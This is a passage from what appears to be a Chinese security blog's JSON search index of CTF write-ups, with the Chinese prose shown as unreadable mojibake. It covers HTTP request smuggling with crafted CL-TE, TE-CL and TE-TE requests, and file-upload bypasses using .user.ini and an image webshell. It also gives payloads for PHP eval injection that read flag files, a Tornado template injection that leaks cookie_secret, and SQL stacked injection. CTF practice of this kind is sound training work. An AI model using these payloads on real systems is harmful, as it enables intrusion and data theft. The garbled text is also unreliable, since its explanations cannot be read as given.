æˆäº†å½±å“ï¼Œè€Œä¸”è¿˜å¯ä»¥æ‰©å±•æˆç±»ä¼¼äºCSRFçš„æ”»å‡»æ–¹å¼ã€‚ ä½†æ˜¯ä¸€èˆ¬çš„æœåŠ¡å™¨éƒ½ä¸ä¼šæ¥å—è¿™ç§å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…ã€‚è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿæ‰€ä»¥æƒ³åˆ°å‰é¢æ‰€è¯´çš„RFC2616è§„èŒƒ å¦‚æœæ”¶åˆ°åŒæ—¶å­˜åœ¨Content-Lengthå’ŒTransfer-Encodingè¿™ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œåœ¨å¤„ç†çš„æ—¶å€™å¿…é¡»å¿½ç•¥Content-Lengthã€‚ æ‰€ä»¥è¯·æ±‚åŒ…ä¸­åŒæ—¶åŒ…å«è¿™ä¸¤ä¸ªè¯·æ±‚å¤´å¹¶ä¸ç®—è¿è§„ï¼ŒæœåŠ¡å™¨ä¹Ÿä¸éœ€è¦è¿”å›400é”™è¯¯ã€‚å¯¼è‡´æœåŠ¡å™¨åœ¨è¿™é‡Œçš„å®ç°æ›´å®¹æ˜“å‡ºé—®é¢˜ã€‚ CL-TECL-TEï¼Œå°±æ˜¯å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯ä»£ç†æœåŠ¡å™¨åªå¤„ç†Content-Lengthè¯·æ±‚å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¼šéµå®ˆRFC2616çš„è§„å®šï¼Œå¿½ç•¥æ‰Content-Lengthï¼Œå¤„ç†Transfer-Encodingè¯·æ±‚å¤´ã€‚ chunkä¼ è¾“æ•°æ®(sizeçš„å€¼ç”±16è¿›åˆ¶è¡¨ç¤º) 1[chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size &#x3D; 0][\\r\\n][\\r\\n] chunkedç¼–ç å‚è€ƒï¼šhttpåè®®ä¸­content-length ä»¥åŠchunkedç¼–ç åˆ†ææ„é€ è¯·æ±‚ç¤ºä¾‹ï¼š 12345678910POST / HTTP/1.1\\r\\nHost: test.com\\r\\n......Connection: keep-alive\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\na è¿ç»­å‘é€å‡ æ¬¡è¯·æ±‚å°±å¯ä»¥è·å¾—å“åº”ã€‚æ”»å‡»æµç¨‹ï¼šç”±äºå‰ç«¯æœåŠ¡å™¨å¤„ç†Content-Lengthï¼Œæ‰€ä»¥è¿™ä¸ªè¯·æ±‚å¯¹äºå®ƒæ¥è¯´æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œè¯·æ±‚ä½“çš„é•¿åº¦ä¸º6ï¼Œä¹Ÿå°±æ˜¯ 1230\\r\\n\\r\\na å½“è¯·æ±‚åŒ…ç»è¿‡ä»£ç†æœåŠ¡å™¨è½¬å‘ç»™åç«¯æœåŠ¡å™¨æ—¶ï¼Œåç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingï¼Œå½“å®ƒè¯»å–åˆ° 120\\r\\n\\r\\n è®¤ä¸ºå·²ç»è¯»å–åˆ°ç»“å°¾äº†ã€‚ä½†å‰©ä¸‹çš„å­—æ¯aå°±è¢«ç•™åœ¨äº†ç¼“å†²åŒºä¸­ï¼Œç­‰å¾…ä¸‹ä¸€æ¬¡è¯·æ±‚ã€‚å½“æˆ‘ä»¬é‡å¤å‘é€è¯·æ±‚åï¼Œå‘é€çš„è¯·æ±‚åœ¨åç«¯æœåŠ¡å™¨æ‹¼æ¥æˆäº†ç±»ä¼¼ä¸‹é¢è¿™ç§è¯·æ±‚ï¼š 123aPOST / HTTP/1.1\\r\\nHost: test.com\\r\\n...... æœåŠ¡å™¨åœ¨è§£ææ—¶å°±ä¼šäº§ç”ŸæŠ¥é”™äº†ï¼Œä»è€Œé€ æˆHTTPè¯·æ±‚èµ°ç§ã€‚ TE-CLTE-CLï¼Œå°±æ˜¯å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯ä»£ç†æœåŠ¡å™¨å¤„ç†Transfer-Encodingè¯·æ±‚å¤´ï¼Œåç«¯æœåŠ¡å™¨å¤„ç†Content-Lengthè¯·æ±‚å¤´ã€‚æ„é€ è¯·æ±‚ç¤ºä¾‹ï¼š 1234567891011POST / HTTP/1.1\\r\\nHost: test.com\\r\\n......Content-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n12\\r\\naPOST / HTTP/1.1\\r\\n\\r\\n0\\r\\n\\r\\n æ”»å‡»æµç¨‹ï¼šå‰ç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingï¼Œå½“å…¶è¯»å–åˆ° 120\\r\\n\\r\\n è®¤ä¸ºæ˜¯è¯»å–å®Œæ¯•äº†ã€‚æ­¤æ—¶è¿™ä¸ªè¯·æ±‚å¯¹ä»£ç†æœåŠ¡å™¨æ¥è¯´æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œç„¶åè½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œåç«¯æœåŠ¡å™¨å¤„ç†Content-Lengthè¯·æ±‚å¤´ï¼Œå› ä¸ºè¯·æ±‚ä½“çš„é•¿åº¦ä¸º4.ä¹Ÿå°±æ˜¯å½“å®ƒè¯»å–å®Œ 112\\r\\n å°±è®¤ä¸ºè¿™ä¸ªè¯·æ±‚å·²ç»ç»“æŸäº†ã€‚åé¢çš„æ•°æ®å°±è®¤ä¸ºæ˜¯å¦ä¸€ä¸ªè¯·æ±‚ï¼š 1234aPOST / HTTP/1.1\\r\\n\\r\\n0\\r\\n\\r\\n æˆåŠŸæŠ¥é”™ï¼Œé€ æˆHTTPè¯·æ±‚èµ°ç§ã€‚ TE-TETE-TEï¼Œå½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰åç«¯æœåŠ¡å™¨éƒ½å¤„ç†Transfer-Encodingè¯·æ±‚å¤´ï¼Œç¡®å®æ˜¯å®ç°äº†RFCçš„æ ‡å‡†ã€‚ä¸è¿‡å‰åç«¯æœåŠ¡å™¨ä¸æ˜¯åŒä¸€ç§ã€‚è¿™å°±æœ‰äº†ä¸€ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å‘é€çš„è¯·æ±‚åŒ…ä¸­çš„Transfer-Encodingè¿›è¡ŒæŸç§æ··æ·†æ“ä½œ(å¦‚æŸä¸ªå­—ç¬¦æ”¹å˜å¤§å°å†™)ï¼Œä»è€Œä½¿å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†Transfer-Encodingè¯·æ±‚å¤´ã€‚åœ¨æŸç§æ„ä¹‰ä¸Šè¿™è¿˜æ˜¯CL-TEæˆ–è€…TE-CLã€‚æ„é€ è¯·æ±‚ç¤ºä¾‹ï¼š 123456789101112131415POST / HTTP/1.1\\r\\nHost: test.com\\r\\n......Content-length: 4\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-encoding: cow\\r\\n\\r\\n5c\\r\\naPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0\\r\\n\\r\\n æ”»å‡»æµç¨‹ï¼šå‰ç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingï¼Œå½“å…¶è¯»å–åˆ° 120\\r\\n\\r\\n è®¤ä¸ºæ˜¯è¯»å–ç»“æŸã€‚æ­¤æ—¶è¿™ä¸ªè¯·æ±‚å¯¹ä»£ç†æœåŠ¡å™¨æ¥è¯´æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œç„¶åè½¬å‘ç»™åç«¯æœåŠ¡å™¨å¤„ç†Transfer-encodingè¯·æ±‚å¤´ï¼Œå°†Transfer-Encodingéšè—åœ¨æœåŠ¡ç«¯çš„ä¸€ä¸ªchainä¸­æ—¶ï¼Œå®ƒå°†ä¼šå›é€€åˆ°ä½¿ç”¨Content-Lengthå»å‘é€è¯·æ±‚ã€‚è¯»å–åˆ° 15c\\r\\n è®¤ä¸ºæ˜¯è¯»å–å®Œæ¯•äº†ã€‚åé¢çš„æ•°æ®å°±è®¤ä¸ºæ˜¯å¦ä¸€ä¸ªè¯·æ±‚ï¼š 1234567aPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0\\r\\n\\r\\n æˆåŠŸæŠ¥é”™ï¼Œé€ æˆHTTPè¯·æ±‚èµ°ç§ã€‚ å®ä¾‹å‚è§å˜¶å¼ctf easy calc:https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#RoarCTF-2019-Easy-Calc å‚è€ƒï¼š https://xz.aliyun.com/t/6654#toc-4 https://paper.seebug.org/1048/#31-cl0get","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"httpèµ°ç§","slug":"httpèµ°ç§","permalink":"http://www.m00nback.xyz/tags/http%E8%B5%B0%E7%A7%81/"}]},{"title":"buuctfåˆ·é¢˜-æ–‡ä»¶ä¸Šä¼ ç¯‡","slug":"buuctfåˆ·é¢˜-æ–‡ä»¶ä¸Šä¼ ç¯‡","date":"2020-01-16T10:38:19.000Z","updated":"2020-05-15T08:25:10.791Z","comments":true,"path":"2020/01/16/buuctfåˆ·é¢˜-æ–‡ä»¶ä¸Šä¼ ç¯‡/","link":"","permalink":"http://www.m00nback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†BUUCTFä¸Šwebé¢˜ä¸­æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†çš„writeupï¼ŒæŒç»­æ›´æ–°ä¸­ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†BUUCTFä¸Šwebé¢˜ä¸­æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†çš„writeupï¼ŒæŒç»­æ›´æ–°ä¸­ï¼ [SUCTF 2019]CheckInwriteupæœ¬é¢˜ä¸»è¦è€ƒå¯Ÿäº†å¯¹.user.iniçš„ä½¿ç”¨ é—®é¢˜æ¥äº†ï¼Œä»€ä¹ˆæ˜¯.user.iniï¼Ÿ è¿™å¾—ä»php.iniè¯´èµ·äº†ã€‚php.iniæ˜¯phpé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å¾ˆå¤šphpçš„é…ç½®ï¼Œè¿™äº›é…ç½®ä¸­ï¼Œåˆåˆ†ä¸ºå‡ ç§ï¼šPHP_INI_SYSTEMã€PHP_INI_PERDIRã€PHP_INI_ALLã€PHP_INI_USERã€‚ åœ¨æ¨¡å¼ä¸ºPHP_INI_USERçš„é…ç½®é¡¹æåˆ°äº†.user.iniï¼Œé‚£ä¹ˆè¿™æ˜¯ä¸ªä»€ä¹ˆé…ç½®æ–‡ä»¶ï¼Ÿ phpé…ç½®é¡¹ä¸­æœ‰ä¸¤ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„é¡¹ï¼ˆä¸‹å›¾ç¬¬ä¸€ã€å››ä¸ªï¼‰ï¼š auto_append_fileã€auto_prepend_fileè¿™ä¸¤ä¸ªé…ç½®æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ auto_prepend_fileçš„æ„æ€æ˜¯æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œauto_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š auto_prepend_file=01.gif è¿™æ ·çš„æ´»åœ¨è®¿é—®åŒç›®å½•ä¸‹çš„.phpåç¼€çš„æ–‡ä»¶æ—¶å°±ä¼šæŠŠ01.gifåŒ…å«è¿›å» æ‰€ä»¥ï¼Œ.user.iniçš„åˆ©ç”¨æ¡ä»¶å¦‚ä¸‹ï¼š æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼ ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶ åºŸè¯å°‘è¯´ï¼Œå¼€å§‹è§£é¢˜ï¼ é¦–å…ˆå…ˆä¸Šä¼ ä¸€ä¸ª.user.iniæ–‡ä»¶ å†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œä¸ºäº†æµ‹è¯•å…ˆå†™ä¸ªphpinfo() è®¿é—®ç›®å½•ä¸‹çš„index.phpï¼ŒæˆåŠŸè¿”å› ä¸Šä¼ ä¸€å¥è¯ï¼Œèšå‰‘è¿ï¼Œå‘ç°æ ¹ç›®å½•/flagï¼ŒæˆåŠŸè§£é¢˜ BUUCTFä¸Šæœ‰æºç ,åˆ†æä¸€æ³¢ 123456789101112131415161718192021222324252627282930313233&lt;?php// error_reporting(0);$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);if (!file_exists($userdir)) &#123; mkdir($userdir, 0777, true);&#125;file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);if (isset($_POST[&quot;upload&quot;])) &#123; $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;]; if (!$tmp_name) &#123; die(&quot;filesize too big!&quot;); &#125; if (!$name) &#123; die(&quot;filename cannot be empty!&quot;); &#125; $extension = substr($name, strrpos($name, &quot;.&quot;) + 1); if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) &#123; //é»‘åå•ï¼Œå¯¹phå’Œhtacesså¿½ç•¥å¤§å°å†™è¿‡æ»¤ die(&quot;illegal suffix!&quot;); &#125; if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123; //è¯»å–æ–‡ä»¶ï¼Œè¿‡æ»¤&lt;?,ç”¨&lt;script language=&#x27;php&#x27;&gt;&lt;script/&gt;ç»•è¿‡ die(&quot;&amp;lt;? in contents!&quot;); &#125; $image_type = exif_imagetype($tmp_name); //æ–‡ä»¶å¤´æ£€æµ‹ï¼ŒåŠ GIF89aç»•è¿‡ if (!$image_type) &#123; die(&quot;exif_imagetype:not image!&quot;); &#125; $upload_file_path = $userdir . &quot;/&quot; . $name; move_uploaded_file($tmp_name, $upload_file_path); echo &quot;Your dir &quot; . $userdir. &#x27; &lt;br&gt;&#x27;; echo &#x27;Your files : &lt;br&gt;&#x27;; var_dump(scandir($userdir));&#125; [ACTF2020 æ–°ç”Ÿèµ›]UploadæŸ¥çœ‹æºç å‘ç°å¯ä»¥ä¸Šä¼ ï¼Œå°†é¼ æ ‡ç§»åˆ°ä¸­é—´å°±å¯ä»¥ä¸Šä¼ äº† å‰ç«¯æœ‰jsæ£€éªŒï¼Œç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬æ”¹åç¼€åï¼Œä¸Šä¼ phpå¯ä»¥å¤§å°å†™ï¼Œä½†ä¸èƒ½æˆåŠŸè§£æï¼Œphp3,php5ä¹Ÿä¸èƒ½è§£æ æœ€åå‘ç°phtmlå¯ä»¥è§£æï¼Œgetshellååœ¨ä¸Šä¼ ä¸Šå±‚ç›®å½•å‘ç°.htaccess 123&lt;FilesMatch \\.phtml$&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"buuctf","slug":"buuctf","permalink":"http://www.m00nback.xyz/tags/buuctf/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"http://www.m00nback.xyz/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"buuctfåˆ·é¢˜-ä»£ç å‘½ä»¤æ³¨å…¥ç¯‡","slug":"buuctfåˆ·é¢˜-ä»£ç å‘½ä»¤æ³¨å…¥ç¯‡","date":"2020-01-16T09:59:46.000Z","updated":"2020-08-09T08:41:20.715Z","comments":true,"path":"2020/01/16/buuctfåˆ·é¢˜-ä»£ç å‘½ä»¤æ³¨å…¥ç¯‡/","link":"","permalink":"http://www.m00nback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†buuctfä¸Šwebéƒ¨åˆ†ä»£ç æ³¨å…¥å’Œå‘½ä»¤æ‰§è¡Œç›¸å…³é¢˜ç›®çš„writeupï¼æŒç»­æ›´æ–°ä¸­ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†buuctfä¸Šwebéƒ¨åˆ†ä»£ç æ³¨å…¥å’Œå‘½ä»¤æ‰§è¡Œç›¸å…³é¢˜ç›®çš„writeupï¼æŒç»­æ›´æ–°ä¸­ï¼ [RoarCTF 2019]Easy Calcwriteupæ‰“å¼€æŸ¥çœ‹æºç å‘ç°æ˜¯é€šè¿‡GETè¯·æ±‚calc.phpæ¥è·å–ç­”æ¡ˆçš„ï¼Œç›´æ¥è®¿é—®èƒ½çœ‹åˆ°æºç  123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; å…ˆä»‹ç»ä¸€ä¸‹PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ï¼ŒPHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š åˆ é™¤ç©ºç™½ç¬¦ å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰ ä»¥è¿™é¢˜ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ç±»ä¼¼ä¸‹é¢çš„payloadæ¥ç»•è¿‡wafï¼Œwafåœ¨å“ªï¼Ÿæˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œåˆšå¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯ç”¨phpå†™çš„wafï¼Œæ‰¾äº†å¥½ä¹…æ²¡æ‰¾åˆ°ï¼Œåæ¥çœ‹å¤§ä½¬ä»¬çš„åšå®¢æ‰å‘ç°å¹¶ä¸æ˜¯ wafå¯èƒ½ä¸å…è®¸ä¼ é€’ä¼ é€’çš„numå‚æ•°çš„å€¼æœ‰å­—æ¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨%20numæ¥ä¼ é€’ï¼Œè¿™æ ·wafé‚£è¾¹è§£æçš„å°±æ˜¯%20numè¿™ä¸ªå‚æ•°ï¼Œè€Œåœ¨phpé‚£é‡Œè§£æçš„å°±æ˜¯numè¿™ä¸ªå‚æ•° 1calc.php?%20num= æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰¾ä¸€ä¸‹flagæ–‡ä»¶ä½ç½®ï¼ŒæŸ¥çœ‹flag 123calc.php?%20num=var_dump(scandir(chr(47))) #æŸ¥çœ‹flagä½ç½® calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) #è¯»flag æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨æ— å‚æ•°å‡½æ•°æ¥æ„é€ payload è¿˜å¯ä»¥ç”¨httpèµ°ç§æ¥æ„é€ ï¼Œå…·ä½“å‚è§ï¼šhttps://www.moonback.xyz/2020/01/17/httpèµ°ç§å­¦ä¹ /[](https://www.moonback.xyz/2020/01/17/httpèµ°ç§å­¦ä¹ /) æˆ‘ä»¬å°±å¯ä»¥æ„é€ è¿™ç§ï¼Œåœ¨è¯·æ±‚å¤´é‡ŒåŠ ä¸Šä¸‹é¢å†…å®¹ï¼Œå¹¶åŠ ä¸Šå‡ ä¸ªå›è½¦ 1234Transfer-Encoding: chunked å‚è€ƒï¼š http://62.234.60.226/2019/10/19/RoarCTF-wp.html [æŠ¤ç½‘æ¯ 2018]easy_tornadowriteupæ‰“å¼€é¢˜ç›®å‘ç°ä¸‰ä¸ªæ–‡ä»¶ï¼Œflag.txtæç¤ºflagåœ¨/fllllllllllllagï¼Œwelcome.txtæç¤ºrenderï¼Œhints.txtæç¤ºmd5(cookie_secret+md5(filename))ï¼Œç»“åˆé¢˜ç›®åå­—ï¼Œè”æƒ³åˆ°pythonä¸­çš„tornadoæ¡†æ¶renderæ¨¡æ¿æ³¨å…¥ cookie_secretå­˜æ”¾åœ¨handler.settingsä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¯»å–å‡ºcookie_secretï¼Œpayload: 1error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125; å‘ç°æˆåŠŸè¯»å–åˆ°cookie_secretï¼ŒæŒ‰ç…§æç¤ºç»™çš„æ ¼å¼è¯»å–flag 1234&lt;?php$cookie_secret=&#x27;a33e0b4f-63b4-4ede-90b5-cc7bb45f48ca&#x27;;$filename=&#x27;/fllllllllllllag&#x27;;echo md5($cookie_secret.md5($filename)); å°è¯•è®¿é—®ï¼Œå¾—åˆ°flag 1file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;8089e3218f80b4c12a208cc0e9974d98 [CISCN 2019 åˆèµ›]Love Mathwriteupæºç ï¼š 12345678910111213141516171819202122232425262728 &lt;?phperror_reporting(0);//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; //ä¾‹å­ c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 80) &#123; die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;); &#125; &#125; //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;); &#125; &#125; //å¸®ä½ ç®—å‡ºç­”æ¡ˆ eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"buuctf","slug":"buuctf","permalink":"http://www.m00nback.xyz/tags/buuctf/"},{"name":"ä»£ç æ³¨å…¥","slug":"ä»£ç æ³¨å…¥","permalink":"http://www.m00nback.xyz/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œ","permalink":"http://www.m00nback.xyz/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"buuctfåˆ·é¢˜-sqlæ³¨å…¥ç¯‡","slug":"buuctfåˆ·é¢˜-sqlæ³¨å…¥ç¯‡","date":"2020-01-16T07:52:41.000Z","updated":"2020-08-08T12:39:55.856Z","comments":true,"path":"2020/01/16/buuctfåˆ·é¢˜-sqlæ³¨å…¥ç¯‡/","link":"","permalink":"http://www.m00nback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦è®°å½•äº†buuctfä¸Šwebéƒ¨åˆ†sqlæ³¨å…¥ç±»å‹é¢˜ç›®çš„writeupï¼æŒç»­æ›´æ–°ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦è®°å½•äº†buuctfä¸Šwebéƒ¨åˆ†sqlæ³¨å…¥ç±»å‹é¢˜ç›®çš„writeupï¼æŒç»­æ›´æ–°ï¼ [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨writeupå¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯å †å æ³¨å…¥ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆæŸ¥è¯¢ä¸‹æ•°æ®åº“ ä¸ç»•å¼¯å­ï¼Œflagåœ¨supersqlié‡Œçš„1919810931114514è¡¨é‡Œï¼Œç°åœ¨æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥å¾—åˆ°flag æ–¹å¼1ä½¿ç”¨prepareå’Œexecuteæ¥æ„é€ è¯­å¥ä»è€Œç»•è¿‡è¿‡æ»¤ï¼Œpayloadå¦‚ä¸‹ï¼š 1?inject=1&#x27;%3BSet%40a%3D0x73656c656374202a2066726f6d20603139313938313039333131313435313460%3Bprepare+b+from+%40a%3Bexecute+b%3B%23 urlè§£ç åæ˜¯ï¼š 11&#x27;;Set@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare b from @a;execute b;# å…¶ä¸­é‚£æ®µ16è¿›åˆ¶å­—ç¬¦ä¸²çš„æ„æ€æ˜¯ 1select * from `1919810931114514` ç±»ä¼¼çš„payloadè¿˜æœ‰ 1&#x27;;use supersqli;set @sql=concat(&#x27;s&#x27;,&#x27;elect `flag` from `1919810931114514`&#x27;);PREPARE stmt1 FROM @sql;EXECUTE stmt1; 